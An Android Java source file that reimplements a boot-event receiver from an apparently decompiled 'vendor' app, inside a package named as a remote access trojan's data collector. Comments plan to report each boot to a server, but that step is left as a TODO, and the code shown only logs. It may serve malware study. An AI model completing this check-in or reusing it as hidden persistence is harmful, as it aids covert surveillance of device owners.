package com.vendor.rat.data.collector;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.UserManager;
import android.util.Log;

/**
 * ADAPT: vendor com.guard.wallet.receiver.BootBroadcast
 * Handles BOOT_COMPLETED and LOCKED_BOOT_COMPLETED.
 */
public class BootBroadcast extends BroadcastReceiver {

    private static final String TAG = "BootBroadcast";

    // ADAPT: vendor field f193a (Integer, init 0) — receiver alive flag
    public Integer receiverAlive = 0;

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            this.receiverAlive = 1;
            if (intent == null) return;
            String action = intent.getAction();
            if (action == null || action.isEmpty()) return;

            if ("android.intent.action.LOCKED_BOOT_COMPLETED".equals(action)) {
                Log.d(TAG, "手机开机了,没有解锁");
                // ADAPT: vendor calls w.b.a() — init routine
            } else if ("android.intent.action.BOOT_COMPLETED".equals(action)) {
                Log.d(TAG, "手机开机了 ");
                // ADAPT: vendor calls w.b.a() — init routine
                UserManager um = (UserManager) context.getSystemService("user");
                if (um != null && um.isUserUnlocked()) {
                    // ADAPT: vendor calls h.D(1, "has_receive_completed")
                    Log.d(TAG, "User unlocked, marking boot completed");
                }
            }

            // ADAPT: vendor builds BootEventVO with packageName + hasReceiveCompleted
            // wraps in MessageRecordVO and sends via MainApplication.getHandlerMsgAndTimer().b()
            Log.d(TAG, "Boot event: " + action + ", pkg=" + context.getPackageName());
            // TODO: VENDOR_VERIFY — send boot event to server
        } catch (Exception e) {
            Log.e(TAG, "Error in onReceive", e);
        }
    }
}